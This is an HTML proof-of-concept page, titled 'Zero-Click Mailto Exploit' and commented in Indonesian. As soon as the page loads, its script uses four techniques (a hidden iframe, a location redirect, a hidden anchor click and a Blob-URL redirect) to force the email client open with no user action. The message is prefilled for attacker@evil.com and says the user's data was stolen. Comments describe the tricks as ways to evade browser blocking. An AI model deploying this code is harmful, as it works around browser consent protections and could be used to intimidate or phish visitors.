<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Zero-Click Mailto Exploit</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
        .panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 600px; width: 100%; border: 1px solid #333; }
        h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; }
        p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
        #status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
        .log { background: #000; color: #0f0; padding: 10px; border-radius: 6px; font-family: monospace; text-align: left; margin-top: 15px; height: 150px; overflow-y: auto; font-size: 12px; }
    </style>
</head>

<body>
<div class="panel" id="main-panel">
    <h1>Zero-Click Mailto Exploit</h1>
    <p>Mencoba membuka aplikasi Email secara otomatis tanpa interaksi (No Gesture).</p>
    <div id="status" role="status">Memuat halaman...</div>
    <div class="log" id="log">Log akan muncul di sini...</div>
</div>

<script>
    const statusDiv = document.getElementById("status");
    const logDiv = document.getElementById("log");

    function log(msg) {
        logDiv.innerHTML += "<br>> " + msg;
        console.log(msg);
    }

    // Payload mailto
    const mailtoUrl = "mailto:attacker@evil.com?subject=System%20Compromised&body=Your%20data%20has%20been%20stolen";

    // --- METODE 1: IFrame Injection (Seringkali lolos dari blokir) ---
    function triggerViaIframe() {
        try {
            log("Mencoba metode: Iframe Injection...");
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = mailtoUrl;
            document.body.appendChild(iframe);
            
            // Cleanup
            setTimeout(() => {
                if (iframe.parentNode) document.body.removeChild(iframe);
            }, 2000);
        } catch (e) {
            log("Iframe gagal: " + e.message);
        }
    }

    // --- METODE 2: Synchronous window.location (Race Condition) ---
    function triggerViaLocation() {
        try {
            log("Mencoba metode: window.location...");
            window.location.href = mailtoUrl;
        } catch (e) {
            log("Location gagal: " + e.message);
        }
    }

    // --- METODE 3: Anchor Click (Trik klik tersembunyi) ---
    function triggerViaAnchor() {
        try {
            log("Mencoba metode: Anchor Click...");
            const a = document.createElement('a');
            a.href = mailtoUrl;
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click();
            setTimeout(() => {
                if (a.parentNode) document.body.removeChild(a);
            }, 2000);
        } catch (e) {
            log("Anchor gagal: " + e.message);
        }
    }

    // --- METODE 4: Blob URL Redirect (Jembatan) ---
    function triggerViaBlob() {
        try {
            log("Mencoba metode: Blob URL Redirect...");
            const blobHTML = `<script>window.location.href='${mailtoUrl}';<\/script>`;
            const blob = new Blob([blobHTML], { type: 'text/html' });
            const url = URL.createObjectURL(blob);
            
            // Buka di iframe agar tidak memicu blokir pop-up
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = url;
            document.body.appendChild(iframe);
            
            setTimeout(() => {
                if (iframe.parentNode) document.body.removeChild(iframe);
                URL.revokeObjectURL(url);
            }, 2000);
        } catch (e) {
            log("Blob gagal: " + e.message);
        }
    }

    // EKSEKUSI OTOMATIS SAAT DOM SIAP (NO GESTURE)
    window.addEventListener("DOMContentLoaded", () => {
        statusDiv.textContent = "Memicu Zero-Click Mailto...";
        
        // Tembak semua metode secara berurutan
        triggerViaIframe();
        
        setTimeout(triggerViaLocation, 100);
        setTimeout(triggerViaAnchor, 200);
        setTimeout(triggerViaBlob, 300);

        // Update status
        setTimeout(() => {
            statusDiv.textContent = "Semua metode dipicu. Cek apakah aplikasi Email terbuka!";
            statusDiv.style.color = "#4CAF50";
        }, 500);
    });
</script>
</body>
</html>
